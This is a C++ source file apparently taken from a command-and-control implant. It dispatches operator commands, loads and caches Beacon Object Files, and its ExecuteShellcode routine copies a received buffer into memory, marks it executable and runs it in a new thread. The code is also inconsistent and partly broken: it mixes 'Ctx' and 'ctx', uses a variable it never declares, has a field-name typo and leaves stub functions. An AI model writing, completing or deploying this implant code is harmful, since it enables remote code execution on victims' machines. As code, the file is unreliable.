#include <core/include/memory.hpp>

using namespace Hash;
using namespace Opsec;
using namespace Utils;
using namespace Parser;
using namespace Modules;
using namespace Objects;
using namespace Threads;
using namespace Commands;

namespace Memory {
    namespace Methods {
		PRESOURCE FindIntResource(HMODULE base, const INT rsrcId) {
            HRSRC rsrcInfo	= { };
            PRESOURCE object = (RESOURCE*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(RESOURCE));

            rsrcInfo  = Ctx->Win32.FindResourceA(base, MAKEINTRESOURCE(rsrcId), RT_RCDATA);
			if (!rsrcInfo) {
				return nullptr;
			}

            object->GLobal  = Ctx->Win32.LoadResource(base, rsrcInfo);
            object->Size  	= Ctx->Win32.SizeofResource(base, rsrcInfo);
            object->Lock  	= Ctx->Win32.LockResource(object->Global);
defer:
            return object;
        }

        VOID FindHeaders(EXECUTABLE *exe) {
            exe->NtHead 	= (PIMAGE_NT_HEADERS) ((PBYTE)exe->Data + ((PIMAGE_DOS_HEADER)exe->Data)->e_lfanew);
            exe->Symbols 	= (PCOFF_SYMBOL) ((PBYTE)exe->Data + exe->NtHead->FileHeader.PointerToSymbolTable);
            exe->Exports 	= (PIMAGE_EXPORT_DIRECTORY) ((PBYTE)exe->Data + exe->NtHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			exe->Size 		= (SIZE_T) ((PBYTE)exe->Data + exe->NtHead->OptionalHeader.SizeOfImage);
        }
    }

    namespace Context {
        BOOL ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

			SIZE_T size = sizeof(LPVOID);
			ULONG protect = 0;

            return true;
        }

        VOID ContextDestroy() {
            // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = ctx->win32.RtlFreeHeap;
            auto heap = ctx->heap;

            // free bof executables
			// free ctx->strings

            for (auto head = ctx->bof_cache; head; head = head->next) {
                RemoveCOFF(head->bof_id);
            }

            if (free) {
                free(heap, 0, ctx);
            }
        }
    }

    namespace Execute {
        BOOL ExecuteCommand(_parser parser) {
            UINT_PTR pointer = 0;

            const auto cmd_id = UnpackUint32(&parser);
            if (cmd_id == NOJOB) {
                return true;
            }

            if (!(pointer = FindCommandAddress(cmd_id))) {
                // LOG ERROR
                return false;
            }

            const auto cmd = (void(*)(_parser*)) RVA(PBYTE, ctx->base.address, pointer);
            cmd(&parser);

            return true;
        }

		// TODO: process migration
        BOOL ExecuteShellcode(_parser parser) {
            LPVOID base 	= nullptr;
            VOID (*exec)()  = nullptr;

        	HANDLE handle	= nullptr;
            BOOL success	= false;

            SIZE_T size = parser.length;

            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                // LOG ERROR
                goto defer;
            }

            MemCopy(base, parser.buffer, parser.length);

            if (!NT_SUCCESS(ctx->win32.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                // LOG ERROR
                goto defer;
            }

            exec = (VOID(*)()) base;
			ntstatus = Ctx->Win32.NtCreateThreadEx(
					&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE)exec, 
					nullptr, NULL, NULL, NULL, NULL, nullptr);

            MemSet(base, 0, size);
            success = true;
defer:
            if (base) {
                ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
            }

            return success;
        }

        VOID LoadObject(_parser parser) {
            COFF_PARAMS *bof  = (COFF_PARAMS *) Malloc(sizeof(COFF_PARAMS));
            COFF_PARAMS *saved = nullptr;

            bof->entrypoint = UnpackString(&parser, (uint32 *) &bof->entrypoint_length);
            bof->data       = UnpackBytes(&parser, (uint32 *) &bof->data_size);
            bof->args       = UnpackBytes(&parser, (uint32 *) &bof->args_size);
            bof->b_cache    = UnpackByte(&parser);
            bof->bof_id		= UnpackUint32(&parser);
            bof->task_id    = ctx->session.current_taskid;

            // TODO: with previously loaded BOFs (peer_id, task_id, type, length, [entrypoint, null, args, etc..])
            // TODO: test that bof data size being zero is a correct way to do this

            if (!bof->data_size) {
                saved = FindCOFF(bof->bof_id);

                bof->data      = saved->data;
                bof->data_size = saved->data_size;
            }

            if (!CreateUserThread(NtCurrentProcess(), (void *) COFFThread, bof, nullptr)) {
                // LOG ERROR
                // do not return
            }

            if (!saved) {
                AddCOFF(bof);
            }

            // NOTE: keep original task_id after every run or update (?)
            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
            // TODO: server should keep BOF information stored locally for this

            if (!bof->b_cache) {
                RemoveCOFF(bof->bof_id);
            }
        }
    }
}
